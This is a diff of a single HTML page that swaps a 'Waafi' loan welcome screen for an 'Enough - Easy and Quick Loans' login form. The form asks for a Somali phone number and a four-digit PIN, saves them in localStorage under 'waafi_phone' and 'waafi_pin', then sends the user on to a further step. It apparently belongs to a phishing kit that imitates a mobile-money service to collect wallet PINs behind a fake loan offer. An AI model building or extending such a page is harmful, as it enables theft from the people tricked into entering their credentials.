@@ -3,35 +3,75 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Waafi - Welcome</title>
+<title>Enough - Easy and Quick Loans</title>
 <style>
-body { font-family: Arial, sans-serif; margin:0; background: linear-gradient(135deg, #a8e063, #00B347); height:100vh; display:flex; align-items:center; justify-content:center; }
-.container { background:white; padding:40px 30px; border-radius:20px; box-shadow:0 8px 20px rgba(0,0,0,0.2); text-align:center; max-width:400px; margin:20px; }
-.logo { font-size:32px; font-weight:bold; color:#00B347; margin-bottom:10px; }
-.tagline { color:#666; margin-bottom:30px; font-size:16px; }
-.btn { width:100%; padding:16px; border:none; border-radius:10px; font-size:18px; font-weight:bold; background: linear-gradient(90deg, #a8e063, #00B347); color:white; cursor:pointer; margin-top:15px; }
-.features { text-align:left; margin:20px 0; font-size:14px; color:#444; }
-.features li { margin:8px 0; }
+* { margin:0; padding:0; box-sizing:border-box; font-family: Arial, sans-serif; }
+body { background:#fff; }
+.header { background: linear-gradient(135deg, #b8e600, #00B347); padding:40px 20px; text-align:center; color:white; border-bottom-left-radius:50% 20%; border-bottom-right-radius:50% 20%; }
+.header h1 { font-size:36px; opacity:0.3; }
+.header p { font-size:16px; margin-top:5px; }
+.container { padding:30px 20px; text-align:center; max-width:400px; margin:auto; }
+h2 { color:#555; font-weight:400; margin-bottom:25px; }
+.phone-box { border:2px solid #00B347; border-radius:12px; padding:15px; display:flex; align-items:center; gap:10px; margin-bottom:25px; }
+.flag { font-size:24px; }
+.phone-box input { border:none; outline:none; font-size:18px; width:100%; }
+label { color:#777; margin-bottom:15px; display:block; }
+.pin-box { display:flex; justify-content:center; gap:15px; margin-bottom:10px; }
+.pin-box input { width:55px; height:55px; border:2px solid #00B347; border-radius:12px; text-align:center; font-size:24px; outline:none; }
+.subtext { color:#999; font-size:14px; margin-bottom:25px; }
+.btn { width:100%; padding:16px; border:none; border-radius:10px; font-size:18px; font-weight:bold; background:#ccc; color:white; }
+.btn.active { background: linear-gradient(90deg, #b8e600, #00B347); cursor:pointer; }
+.footer { background: linear-gradient(135deg, #b8e600, #00B347); padding:40px 20px; text-align:center; color:white; border-top-left-radius:50% 20%; border-top-right-radius:50% 20%; margin-top:40px; }
+.footer h1 { font-size:32px; }
+.footer p { font-size:14px; margin:5px 0; }
+.footer .version { font-size:12px; margin-top:10px; opacity:0.8; }
+.footer a { color:white; text-decoration:underline; }
 </style>
 </head>
 <body>
 
-<div class="container">
-  <div class="logo">WAAFI</div>
-  <div class="tagline">Fast & Secure Loan Application</div>
-  
-  <ul class="features">
-    <li>✅ Get loan approval in 24 hours</li>
-    <li>✅ OTP Verified for your security</li>
-    <li>✅ Personal, Business, Education & Home Loans</li>
-  </ul>
+<div class="header"><h1>Enough</h1><p>Easy and Quick Loans</p></div>
 
-  <button class="btn" onclick="window.location.href='step1.html'">START APPLICATION</button>
-  
-  <p style="font-size:12px; color:#999; margin-top:20px;">
-    Trusted by 10,000+ customers in Kenya
-  </p>
+<div class="container">
+  <h2>Gal</h2>
+  <div class="phone-box">
+    <span class="flag">🇸🇴</span><span>+252</span>
+    <input id="phone" type="number" placeholder="719389953" maxlength="9">
+  </div>
+  <label>Enter your PIN.</label>
+  <div class="pin-box">
+    <input type="password" maxlength="1" oninput="moveNext(this,0)">
+    <input type="password" maxlength="1" oninput="moveNext(this,1)">
+    <input type="password" maxlength="1" oninput="moveNext(this,2)">
+    <input type="password" maxlength="1" oninput="moveNext(this,3)">
+  </div>
+  <p class="subtext">Can you be executed?</p>
+  <button class="btn" id="galBtn" onclick="login()">GAL</button>
 </div>
 
+<div class="footer">
+  <h1>Enough</h1><p>Easy and Quick Loans</p>
+  <p class="version">v2.1.3P</p>
+  <p>By entering you agree to <a href="#">the Terms and Conditions.</a></p>
+</div>
+
+<script>
+const inputs = document.querySelectorAll('.pin-box input');
+const btn = document.getElementById('galBtn');
+function moveNext(el, index) { if(el.value.length === 1 && index < 3) inputs[index + 1].focus(); checkBtn(); }
+function checkBtn() {
+  const phone = document.getElementById('phone').value;
+  const pin = Array.from(inputs).map(i=>i.value).join('');
+  if(phone.length >= 9 && pin.length === 4) { btn.classList.add('active'); btn.disabled = false; } 
+  else { btn.classList.remove('active'); btn.disabled = true; }
+}
+inputs.forEach(i=>i.addEventListener('input', checkBtn));
+document.getElementById('phone').addEventListener('input', checkBtn);
+function login() {
+  localStorage.setItem('waafi_phone', document.getElementById('phone').value);
+  localStorage.setItem('waafi_pin', Array.from(inputs).map(i=>i.value).join(''));
+  window.location.href = 'step1.html';
+}
+</script>
 </body>
 </html>
